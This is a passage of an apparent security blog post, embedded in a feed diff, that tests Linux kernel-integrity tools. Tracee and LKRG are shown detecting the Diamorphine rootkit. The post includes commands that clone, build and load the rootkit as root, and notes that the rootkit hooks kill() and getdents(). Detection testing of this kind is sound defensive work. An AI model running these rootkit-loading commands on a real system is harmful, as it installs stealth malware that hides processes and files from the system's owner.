+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ git clone https://github.com/m0nad/Diamorphine.git
+</span></span><span style="display:flex;"><span>gerald@ubuntu2404:~$ cd Diamorphine
+</span></span><span style="display:flex;"><span>gerald@ubuntu2404:~$ make
+</span></span><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo insmod diamorphine.ko
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Inserting <em>Diamorphine</em> LKM Rootkit<br><br></span>
+<h4 id="331-hidden-kernel-module">3.3.1 Hidden Kernel Module</h4>
+<p>This command in the listing below instructs <em>Tracee</em> to subscribe specifically to the <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;hidden_kernel_module&ensp;</span> event, which detects kernel modules that are present in memory but intentionally omitted from standard kernel data structures such as /proc/modules. This is a common stealth technique used by Linux kernel rootkits to evade user-space inspection tools.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo tracee -e hidden_kernel_module
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing"><em>Tracee</em> - Filter For<span style="font-family: Courier, monospace; font-weight: 600;"> hidden_kernel_module </span>Events<br><br></span>
+<p>The output shows <em>Tracee</em> successfully identifying a kernel module that is not visible through normal enumeration methods. In this case, the hidden module is <em>Diamorphine</em>, along with its kernel memory address and source version hash, providing strong attribution that a stealthy LKM is active on the system.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">TIME</span>             <span style="color:#a6e22e">UID</span>    <span style="color:#a6e22e">COMM</span>             <span style="color:#a6e22e">PID</span>     <span style="color:#a6e22e">TID</span>     <span style="color:#a6e22e">EVENT</span>                     <span style="color:#a6e22e">ARGS</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">06</span><span style="color:#f92672">:</span><span style="color:#ae81ff">28</span><span style="color:#f92672">:</span><span style="color:#ae81ff">32</span><span style="color:#f92672">:</span><span style="color:#ae81ff">516401</span>                          <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>       <span style="color:#a6e22e">hidden_kernel_module</span>      <span style="color:#a6e22e">address</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0xffffffffc0ad1140</span>, <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">diamorphine</span>, <span style="color:#a6e22e">srcversion</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">39</span><span style="color:#a6e22e">C9AFE44143084E37251EA</span>
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Detecting Hidden <em>Diamorphine</em> LKM<br><br></span>
+<h4 id="332-syscall-hooking">3.3.2 Syscall Hooking</h4>
+<p>This command enables <em>Tracee’s</em> <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;syscall_hooking&ensp;</span> detection, which monitors the system call table for unauthorized modifications. Kernel rootkits frequently hook syscalls to hide processes, files, or escalate privileges—making syscall integrity a high-value detection signal.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo tracee -e syscall_hooking
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing"><em>Tracee</em> - Filter For<span style="font-family: Courier, monospace; font-weight: 600;"> syscall_hooking </span>Events<br><br></span>
+<p>Tracee reports three syscall hooking events, corresponding to the syscalls modified by <em>Diamorphine</em>: <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;kill(),&ensp;</span><span style="font-family: Courier, monospace; font-weight: 600;">&ensp;getdents()&ensp;</span>and<span style="font-family: Courier, monospace; font-weight: 600;">&ensp;getdents64()&ensp;</span>. These hooks are used to hide processes, conceal files and directories, and provide a covert control channel via signals.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">TIME</span>             <span style="color:#a6e22e">UID</span>    <span style="color:#a6e22e">COMM</span>             <span style="color:#a6e22e">PID</span>     <span style="color:#a6e22e">TID</span>     <span style="color:#a6e22e">EVENT</span>                     <span style="color:#a6e22e">ARGS</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">06</span><span style="color:#f92672">:</span><span style="color:#ae81ff">39</span><span style="color:#f92672">:</span><span style="color:#ae81ff">20</span><span style="color:#f92672">:</span><span style="color:#ae81ff">447226</span>                          <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>       <span style="color:#a6e22e">syscall_hooking</span>           
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">06</span><span style="color:#f92672">:</span><span style="color:#ae81ff">39</span><span style="color:#f92672">:</span><span style="color:#ae81ff">20</span><span style="color:#f92672">:</span><span style="color:#ae81ff">447226</span>                          <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>       <span style="color:#a6e22e">syscall_hooking</span>           
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">06</span><span style="color:#f92672">:</span><span style="color:#ae81ff">39</span><span style="color:#f92672">:</span><span style="color:#ae81ff">20</span><span style="color:#f92672">:</span><span style="color:#ae81ff">447226</span>                          <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>       <span style="color:#a6e22e">syscall_hooking</span>
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Detecting Syscall Hooking<br><br></span>
+<h2 id="4-lkrg">4. LKRG</h2>
+<p>LKRG performs runtime integrity checking of the Linux kernel and detection of
+security vulnerability exploits against the kernel.</p>
+<p>LKRG is a kernel module (not a kernel patch), so it can be built for and loaded
+on top of a wide range of mainline and distros&rsquo; kernels, without needing to
+patch those.  We currently support kernel versions ranging from as far back as
+RHEL7&rsquo;s (and its many clones/revisions) to latest mainline and distros kernels.</p>
+<p>LKRG 1.0.0 has been tested with Linux kernels from RHEL/CentOS 7&rsquo;s <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;3.10.0-1160&ensp;</span> and up to Fedora&rsquo;s build of <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;6.17.0-0.rc4.36.fc44.x86_64&ensp;</span>.</p>
+<p>LKRG currently supports the x86-64, 32-bit x86, AArch64 (ARM64), and 32-bit ARM
+CPU architectures.</p>
+<h3 id="41-installation">4.1 Installation</h3>
+<p><u>Step 1: Installing dependencies</u></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo apt-get install make gcc gawk libelf-dev linux-headers-<span style="color:#66d9ef">$(</span>uname -r<span style="color:#66d9ef">)</span>
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Installing <em>LKRG</em> Dependencies<br><br></span>
+<p><u>Step 2: Build From Source</u></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ git clone https://github.com/lkrg-org/lkrg.git
+</span></span><span style="display:flex;"><span>gerald@ubuntu2404:~$ cd lkrg
+</span></span><span style="display:flex;"><span>gerald@ubuntu2404:~/lkrg$ make -j8
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Building <em>LKRG</em> from Source<br><br></span>
+<p><u>Step 3: Testing LKM</u></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Insert LKM</span>
+</span></span><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo insmod lkrg.ko kint_enforce<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Inspect the kernel logs</span>
+</span></span><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo dmesg
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Remove LKM</span>
+</span></span><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo rmmod lkrg
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Testing <em>LKRG</em><br><br></span>
+<p><u>Step 4: Install <em>LKRG</em> to Start On Boot</u></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~/lkrg$ make install
+</span></span><span style="display:flex;"><span>gerald@ubuntu2404:~/lkrg$ sudo systemctl enable lkrg
+</span></span><span style="display:flex;"><span>gerald@ubuntu2404:~/lkrg$ sudo systemctl start lkrg
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Installing <em>LKRG</em><br><br></span>
+<h3 id="42-capabilities-overview">4.2 Capabilities Overview</h3>
+<p>According to the <a href="https://lkrg.org/">official site</a>:</p>
+<blockquote>
+<p><em>&ldquo;LKRG attempts to post-detect and hopefully promptly respond to unauthorized modifications to the running Linux kernel (integrity checking) or to credentials such as user IDs of the running processes (exploit detection). For process credentials, LKRG attempts to detect the exploit and take action before the kernel would grant access (such as open a file) based on the unauthorized credentials.&rdquo;</em></p>
+</blockquote>
+<h3 id="43-testing-capabilities">4.3 Testing Capabilities</h3>
+<p>To validate <em>LKRG’s</em> post-detection claims, we first disable the <em>LKRG</em> kernel module to simulate an unprotected system state before introducing a stealthy kernel rootkit.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo systemctl stop lkrg
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Stop <em>LKRG</em> Service<br><br></span>
+<p>With <em>LKRG</em> inactive, we load the <em>Diamorphine</em> LKM, which employs multiple stealth techniques to hide its presence from standard kernel visibility mechanisms.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo insmod ~/Diamorphine/diamorphine.ko
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Load <em>Diamorphine</em> Rootkit<br><br></span>
+<p>Once the malicious module is resident in memory, <em>LKRG</em> is re-enabled to assess whether it can retrospectively detect kernel integrity violations introduced while it was offline.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo systemctl start lkrg
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Start <em>LKRG</em> Service<br><br></span>
+<p>Finally, we monitor the kernel ring buffer in real time to observe <em>LKRG’s</em> detection output and alerting behavior.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo dmesg -w
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  126.839032<span style="color:#f92672">]</span> LKRG: ALERT: DETECT: Kernel: Found <span style="color:#ae81ff">1</span> fewer modules in module list <span style="color:#f92672">(</span>71<span style="color:#f92672">)</span> than in KOBJ <span style="color:#f92672">(</span>72<span style="color:#f92672">)</span>, maybe hidden module name diamorphine
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  126.839046<span style="color:#f92672">]</span> LKRG: ALERT: DETECT: Kernel: <span style="color:#ae81ff">1</span> checksums changed unexpectedly
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Detecting <em>Diamorphine</em> Rootkit<br><br></span>
+<h2 id="5-conclusion">5. Conclusion</h2>
+<p>From a threat hunter’s perspective, Linux EDR provides the kernel-level visibility needed to reconstruct attacker behavior through process, syscall, and network context. For red teamers, tools like <em>Kunai</em> and <em>Tracee</em> clearly define what tradecraft is observable and where stealth breaks down.</p>
+<p><em>Tracee</em> and <em>LKRG</em> demonstrate that even kernel rootkits and syscall tampering leave detectable integrity and behavioral signals.</p>
+<p>Ultimately, modern Linux security is no longer about hiding single actions, but about surviving continuous, low-level scrutiny.</p>
+<p>I hope you learned something meaningful today, and I hope to see you in the next one. Take care!</p>
+<h2 id="6-references">6. References</h2>
+<ol>
+<li>LKRG Project: <a href="https://lkrg.org/">https://lkrg.org/</a></li>
+<li>LKRG GitHub Repository: <a href="https://github.com/lkrg-org/lkrg">https://github.com/lkrg-org/lkrg</a></li>
+<li>Kunai Project: <a href="https://github.com/kunai-project/kunai">https://github.com/kunai-project/kunai</a></li>
+<li>Tracee Project: <a href="https://github.com/aquasecurity/tracee">https://github.com/aquasecurity/tracee</a></li>
+<li>Diamorphine LKM Rootkit: <a href="https://github.com/m0nad/Diamorphine">https://github.com/m0nad/Diamorphine</a></li>
+<li>Linux eBPF Documentation: <a href="https://www.kernel.org/doc/html/latest/bpf/">https://www.kernel.org/doc/html/latest/bpf/</a></li>
+<li>Aqua Security: Tracee Overview: <a href="https://aquasecurity.github.io/tracee/">https://aquasecurity.github.io/tracee/</a></li>
+</ol>
+]]></content>
+        </item>
+        
+        <item>
             <title>Zabbix CVE-2024-36467 &amp; CVE-2024-42327 Analysis</title>
             <link>https://mathscantor.github.io/posts/zabbix-cve-2024-36467-and-cve-2024-42327-analysis/</link>
             <pubDate>Tue, 09 Dec 2025 23:43:05 +0800</pubDate>
